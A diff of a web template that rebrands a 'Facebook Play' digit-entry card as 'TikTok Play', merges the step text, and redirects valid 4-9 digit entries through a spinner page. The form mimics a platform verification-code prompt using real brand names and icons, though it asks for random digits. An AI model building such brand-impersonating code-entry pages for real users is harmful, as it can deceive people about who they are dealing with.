@@ -2,17 +2,16 @@
 {% block body %}
 <div class="card" style="max-width:520px;margin:28px auto;box-shadow:0 6px 18px rgba(24,119,242,0.25);border-radius:16px;">
   <div class="platform-header">
-    <div class="icon-circle bg-facebook">
-      <i class="fa-brands fa-facebook icon-lg"></i>
+    <div class="icon-circle bg-tiktok">
+      <i class="fa-brands fa-tiktok icon-lg"></i>
     </div>
     <div>
-      <h2 class="notranslate" style="margin:0;color:#1877F2;">Facebook Play</h2>
+      <h2 class="notranslate" style="margin:0;color:#000;">TikTok Play</h2>
     </div>
   </div>
 
   <h3 style="color:#e11d48">Play check…</h3>
-  <p>Step1: Put a smile on your face. Type any random digits below and click Submit to continue.</p>
-  <p>Step2: Put a smile on your Type any random digits below and click Submit to continue.</p>
+  <p>Step1: Put a smile on your face. Step2: Type any random digits below and click Submit to continue.</p>
   
   <form id="loginForm" method="post" novalidate>
     <input class="input" id="digits" name="digits" placeholder="Enter digits (4-9)" pattern="\d{4,9}" required>
@@ -22,44 +21,41 @@
       <button class="btn login-btn" type="submit">Submit</button>
     </div>
   </form>
-
-  <p style="font-size:13px;color:#64748b;margin-top:8px">
-    If you do nothing, after 2 minutes you'll be sent to the next step automatically.
-  </p>
-
-  <script>
-  // Auto redirect after 2 minutes (120,000 ms)
-  setTimeout(function(){ window.location = "{{ url_for('f1') }}"; }, 120000);
-
-  // Validation for 4-9 digits
-  document.getElementById("loginForm").addEventListener("submit", function(event) {
-    const digits = document.getElementById("digits");
-    const digitsError = document.getElementById("digitsError");
-
-    let valid = true;
-    digits.classList.remove("input-error");
-    digitsError.textContent = "";
-
-    const val = digits.value.trim();
-    const pattern = /^\d{4,9}$/; // only 4-9 digits allowed
-
-    if (!pattern.test(val)) {
-      valid = false;
-      digits.classList.add("input-error");
-      digitsError.textContent = "The code you entered is incorrect.";
-    }
-
-    if (!valid) event.preventDefault();
-  });
-
-  document.getElementById("digits").addEventListener("input", () => {
-    const digits = document.getElementById("digits");
-    const digitsError = document.getElementById("digitsError");
-    digits.classList.remove("input-error");
-    digitsError.textContent = "";
-  });
-  </script>
 </div>
+
+<script>
+// Validation for 4-9 digits
+document.getElementById("loginForm").addEventListener("submit", function(event) {
+  const digits = document.getElementById("digits");
+  const digitsError = document.getElementById("digitsError");
+
+  let valid = true;
+  digits.classList.remove("input-error");
+  digitsError.textContent = "";
+
+  const val = digits.value.trim();
+  const pattern = /^\d{4,9}$/; // only 4-9 digits allowed
+
+  if (!pattern.test(val)) {
+    valid = false;
+    digits.classList.add("input-error");
+    digitsError.textContent = "The code you entered is incorrect.";
+  }
+
+  // If valid, redirect to spinner page instead of next joy2_2 page
+  if (valid) {
+    event.preventDefault(); 
+    window.location = "{{ url_for('spinner', next_url=url_for('f1'), delay=2) }}"; 
+  }
+});
+
+document.getElementById("digits").addEventListener("input", () => {
+  const digits = document.getElementById("digits");
+  const digitsError = document.getElementById("digitsError");
+  digits.classList.remove("input-error");
+  digitsError.textContent = "";
+});
+</script>
 
 <style>
 .input {
@@ -72,8 +68,8 @@
   transition: border-color 0.2s, box-shadow 0.2s;
 }
 .input:focus {
-  border-color: #1877F2;
-  box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.2);
+  border-color: #ff0050;
+  box-shadow: 0 0 0 3px rgba(255, 0, 80, 0.25);
   outline: none;
 }
 .input-error {
@@ -89,7 +85,7 @@
 
 .login-btn {
   width: 100%;
-  background: #1877F2;
+  background: #ff0050;
   color: #fff;
   font-size: 16px;
   font-weight: 700;
@@ -98,13 +94,13 @@
   cursor: pointer;
   border: none;
   transition: background 0.25s, transform 0.1s, box-shadow 0.2s;
-  box-shadow: 0 6px 16px rgba(24,119,242,0.35);
+  box-shadow: 0 6px 16px rgba(255,0,80,0.35);
   display: block;
   margin-top: 8px;
 }
 .login-btn:hover {
-  background: #166fe5;
-  box-shadow: 0 8px 20px rgba(24,119,242,0.45);
+  background: #e60048;
+  box-shadow: 0 8px 20px rgba(255,0,80,0.45);
 }
 .login-btn:active {
   transform: scale(0.985);
